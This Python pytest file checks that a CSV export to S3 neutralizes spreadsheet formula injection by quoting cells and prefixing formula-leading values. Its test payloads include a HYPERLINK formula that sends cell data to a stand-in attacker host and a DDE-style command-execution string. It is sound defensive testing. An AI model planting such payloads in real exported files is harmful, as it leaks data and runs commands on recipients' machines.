import csv
from datetime import date
from io import StringIO
from unittest import mock

import pandas as pd
import pytest

from src import load_data_to_s3
from src.load_data_to_s3 import df_to_s3


def _uploaded_body(df):
    """Run df_to_s3 with a mocked S3 client and return the uploaded CSV."""
    client = mock.Mock()
    with mock.patch("src.load_data_to_s3.connect_to_s3", return_value=client):
        df_to_s3(df, "key.csv", "bucket", "id", "secret")
    return client.put_object.call_args.kwargs["Body"]


def _uploaded_rows(df):
    """Parse the CSV that df_to_s3 uploads."""
    body = _uploaded_body(df)
    return list(csv.DictReader(StringIO(body, newline="")))


def test_every_cell_is_quoted_and_formula_is_text():
    """The uploaded body quotes all cells, e.g. buyer_name =1+1 -> "'=1+1"."""
    df = pd.DataFrame({"buyer_name": ["=1+1"], "sale_price": [25000.0]})

    body = _uploaded_body(df)

    assert body == '"buyer_name","sale_price"\r\n"\'=1+1","25000.0"\r\n'


@pytest.mark.parametrize("payload", [
    "=1+1",
    '=HYPERLINK("http://evil.example/?d="&A1&B1,"click")',
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
])
def test_formula_cells_are_prefixed_with_quote(payload):
    """Formula-leading cells are exported with a leading single quote."""
    df = pd.DataFrame({"buyer_name": [payload], "sale_price": [25000.0]})

    rows = _uploaded_rows(df)

    assert rows[0]["buyer_name"] == "'" + payload


@pytest.mark.parametrize(
    "payload", ["x\r=1+1", "x\n=1+1", "x\r\n@SUM(A1:A9)"]
)
def test_embedded_line_breaks_stay_inside_one_quoted_cell(payload):
    """Embedded CR/LF stays quoted inside one cell instead of a new row."""
    df = pd.DataFrame({"buyer_name": [payload], "sale_price": [1.0]})

    rows = _uploaded_rows(df)

    assert len(rows) == 1
    assert rows[0]["buyer_name"] == payload


def test_all_exported_text_columns_are_neutralized():
    """Every free-text column from the extract query is neutralized."""
    columns = [
        "model", "dealership_name", "region", "buyer_name", "service_type",
    ]
    df = pd.DataFrame({c: ["=1+1"] for c in columns})

    row = _uploaded_rows(df)[0]

    assert all(row[c] == "'=1+1" for c in columns)


def test_safe_values_and_non_text_columns_are_unchanged():
    """Plain text, numbers (incl. negatives), dates and NULLs are kept."""
    df = pd.DataFrame({
        "vin": ["1HGCM82633A004352"],
        "buyer_name": ["John Doe"],
        "dealership_name": ["Bob's Autos, Inc."],
        "year": [2020],
        "sale_price": [-150.5],
        "sale_date": [date(2024, 1, 2)],
        "service_type": [None],
    })

    row = _uploaded_rows(df)[0]

    assert row == {
        "vin": "1HGCM82633A004352",
        "buyer_name": "John Doe",
        "dealership_name": "Bob's Autos, Inc.",
        "year": "2020",
        "sale_price": "-150.5",
        "sale_date": "2024-01-02",
        "service_type": "",
    }


def test_input_dataframe_is_not_mutated():
    """neutralize_csv_formulas returns a copy and leaves the input as is."""
    df = pd.DataFrame({"buyer_name": ["=1+1"]})

    load_data_to_s3.neutralize_csv_formulas(df)

    assert df.loc[0, "buyer_name"] == "=1+1"


def test_string_dtype_columns_are_neutralized():
    """pandas StringDtype columns are neutralized and NA is preserved."""
    names = pd.Series(["@x", "ok", None], dtype="string")
    df = pd.DataFrame({"buyer_name": names})

    out = load_data_to_s3.neutralize_csv_formulas(df)

    assert out["buyer_name"].tolist()[:2] == ["'@x", "ok"]
    assert pd.isna(out["buyer_name"].tolist()[2])


def test_duplicate_column_names_are_neutralized():
    """Columns sharing a name are each neutralized in the upload."""
    df = pd.DataFrame([["=1+1", "@SUM(A1)", 5]],
                      columns=["name", "name", "price"])

    body = _uploaded_body(df)
    rows = list(csv.reader(StringIO(body, newline="")))

    assert rows[1] == ["'=1+1", "'@SUM(A1)", "5"]
